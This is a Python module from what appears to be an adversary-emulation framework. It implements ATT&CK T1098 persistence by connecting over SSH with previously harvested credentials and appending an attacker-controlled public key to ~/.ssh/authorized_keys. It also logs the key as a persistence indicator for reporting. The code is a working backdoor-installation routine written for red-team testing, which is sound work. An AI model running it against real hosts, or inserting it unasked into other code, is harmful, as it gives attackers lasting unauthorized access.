"""
techniques/persistence/ssh_authorized_key.py
ATT&CK: T1098 — Account Manipulation: SSH Authorized Keys
Tactic:  Persistence

Appends an attacker-controlled SSH public key to ~/.ssh/authorized_keys
on the target host, establishing persistent backdoor access that
survives password changes. Requires existing SSH access (from a prior
lateral movement or credential access stage). Records the key and host
in Context so a report can flag it as a persistence indicator.
"""

import paramiko
from typing import Any

from core.context import Context
from core.technique import Tactic, Technique

# Default test key — replace with your own generated key in production
# Generated with: ssh-keygen -t ed25519 -C "mytre-test"
DEFAULT_TEST_PUBKEY = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKeyForMyTREAuthorizedTestingOnly mytre-test"
)


class SSHAuthorizedKey(Technique):
    name = "ssh-authorized-key"
    attack_id = "T1098"
    tactic = Tactic.PERSISTENCE

    def __init__(
        self,
        target: str,
        port: int = 22,
        username: str | None = None,
        password: str | None = None,
        public_key: str = DEFAULT_TEST_PUBKEY,
        timeout: float = 10.0,
    ):
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.public_key = public_key.strip()
        self.timeout = timeout

    def _resolve_creds(self, context: Context) -> tuple[str | None, str | None]:
        if self.username and self.password:
            return self.username, self.password
        creds = context.credentials_valid_on(self.target) or context.credentials
        if creds:
            return creds[0].username, creds[0].password
        return None, None

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        username, password = self._resolve_creds(context)
        if not username or not password:
            return False, "No SSH credentials in Context for SSHAuthorizedKey", {}

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                self.target, port=self.port, username=username, password=password,
                timeout=self.timeout, look_for_keys=False, allow_agent=False,
            )
            commands = [
                "mkdir -p ~/.ssh && chmod 700 ~/.ssh",
                f"echo '{self.public_key}' >> ~/.ssh/authorized_keys",
                "chmod 600 ~/.ssh/authorized_keys",
                "tail -1 ~/.ssh/authorized_keys",  # verify it landed
            ]
            outputs = []
            for cmd in commands:
                _, stdout, stderr = client.exec_command(cmd)
                out = stdout.read().decode("utf-8", errors="replace").strip()
                if out:
                    outputs.append(out)
            client.close()

            key_fingerprint = self.public_key.split()[-1] if self.public_key else "unknown"
            context.extra.setdefault("persistence_indicators", []).append({
                "type": "ssh_authorized_key",
                "host": self.target,
                "key_comment": key_fingerprint,
            })

            summary = (
                f"Persistence established on {self.target}:{self.port} as {username} — "
                f"SSH key added to ~/.ssh/authorized_keys "
                f"(key comment: {key_fingerprint})"
            )
            return True, summary, {
                "target": self.target,
                "username": username,
                "key_comment": key_fingerprint,
                "verification_output": outputs,
            }
        except Exception as exc:
            return False, f"Failed to install SSH key: {exc}", {}
        finally:
            client.close()
